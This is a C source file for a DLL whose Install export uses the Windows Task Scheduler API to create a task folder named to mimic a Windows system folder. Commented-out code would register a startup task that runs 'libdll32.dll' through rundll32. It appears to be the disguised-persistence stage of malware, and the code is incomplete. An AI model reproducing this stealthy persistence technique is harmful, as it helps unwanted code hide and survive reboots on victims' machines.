//#include <string>
#include "definition.h"

#define TASK_FOLDER_NAME L"Microsoft\\Windows\\Registry"
#define FILE_NAME L"libdll32.dll"

EXPORT(Install) {
	HRESULT result = CoInitializeEx(NULL, COINIT_MULTITHREADED);

	if(FAILED(result)) {
		dialogError(result, L"CoInitializeEx");
		return;
	}

	result = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);

	if(FAILED(result)) {
		dialogError(result, L"CoInitializeSecurity");
		goto uninitializeExit;
	}

	ITaskService* taskService = NULL;
	result = CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, &IID_ITaskService, &taskService);

	if(FAILED(result)) {
		dialogError(result, L"CoCreateInstance");
		goto uninitializeExit;
	}

	VARIANT emptyVariant = {VT_EMPTY};
	result = taskService->lpVtbl->Connect(taskService, emptyVariant, emptyVariant, emptyVariant, emptyVariant);

	if(FAILED(result)) {
		dialogError(result, L"ITaskService::Connect");
		goto releaseTaskService;
	}

	ITaskFolder* rootFolder = NULL;
	result = taskService->lpVtbl->GetFolder(taskService, L"\\", &rootFolder);

	if(FAILED(result)) {
		dialogError(result, L"ITaskService::GetFolder");
		goto releaseTaskService;
	}

	ITaskFolder* taskFolder = NULL;
	result = rootFolder->lpVtbl->CreateFolder(rootFolder, TASK_FOLDER_NAME, emptyVariant, &taskFolder);

	if(result == 0x800700B7) {
		result = rootFolder->lpVtbl->GetFolder(rootFolder, TASK_FOLDER_NAME, &taskFolder);
		rootFolder->lpVtbl->Release(rootFolder);

		if(FAILED(result)) {
			dialogError(result, L"ITaskFolder::GetFolder");
			goto releaseTaskService;
		}
	} else {
		rootFolder->lpVtbl->Release(rootFolder);

		if(FAILED(result)) {
			dialogError(result, L"ITaskFolder::CreateFolder");
			goto releaseTaskService;
		}
	}

	ITaskDefinition* taskDefinition = NULL;
	result = taskService->lpVtbl->NewTask(taskService, 0, &taskDefinition);

	if(FAILED(result)) {
		dialogError(result, L"ITaskService::NewTask");
		goto releaseTaskFolder;
	}

	//ITaskDefinition* definition = HI_NewTask(taskService, taskFolder);
	/*HI_SetPrincipal(folder, definition);
	HI_SetTriggers(folder, definition);
	std::wstring programArgument(FILE_NAME);
	programArgument += L",Execute";
	wchar_t* rundll32 = HU_GetSystemDirectory(L"rundll32.exe");
	HI_SetActions(folder, definition, rundll32, programArgument.c_str());
	HI_SetSettings(folder, definition);
	HI_RegisterTask(folder, definition, L"Startup");
	definition->Release();
	folder->Release();*/
releaseTaskFolder:
	taskFolder->lpVtbl->Release(taskFolder);
releaseTaskService:
	taskService->lpVtbl->Release(taskService);
uninitializeExit:
	CoUninitialize();
}
